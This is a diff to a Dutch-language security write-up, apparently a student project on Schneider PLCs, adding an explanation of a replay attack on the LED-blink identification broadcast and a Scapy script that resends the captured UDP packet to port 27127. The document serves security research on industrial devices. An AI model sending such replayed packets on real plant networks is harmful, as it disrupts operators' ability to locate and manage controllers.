@@ -132,6 +132,11 @@ Kort na het schrijven van deze scripts is op exploitdb een exploit van onze lect
 
 #### Ping command ####
 
+In de officiële software van Schneider zit een functie om PLC's te identificeren door hun leds te laten knipperen.  
+Dit werkt door een pakketje te broadcasten naar het hele subnet, dus in de UDP data moet een stuk data zitten waarmee de PLC kan bepalen of het pakketje al dan niet voor hem bestemd is.  
+We hebben de data die naar onze PLC werd verstuurd opgevangen met Wireshark en via Scapy opnieuw verstuurd.  
+Er zit geen beschreming tegen replay attacks op deze functie, waardoor men de PLC continu kan laten knipperen.
+
 ``` python
 from scapy.all import *
 
@@ -146,12 +151,14 @@ payload = bytearray([
 
 crafted = Ether(dst="ff:ff:ff:ff:ff:ff") /\
     IP(src="0.0.0.0", dst="255.255.255.255") /\
-    UDP(sport=0,dport=27127) /\
+    UDP(sport=0, dport=27127) /\
     Raw(load=bytes(payload))
 
 sendp(crafted, iface='enp0s31f6')
-
 ```
+
+Helaas is het ons niet gelukt om te bepalen waar deze identifier juist zit in het pakket, noch om te bepalen waar deze juist word uitgestuurd door de PLC.  
+Indien dit zou lukken zou een aanvaller identificatie van een PLC op de productievloer zeer moeilijk kunnen maken.
 
 #### Discovery protocol ####
 
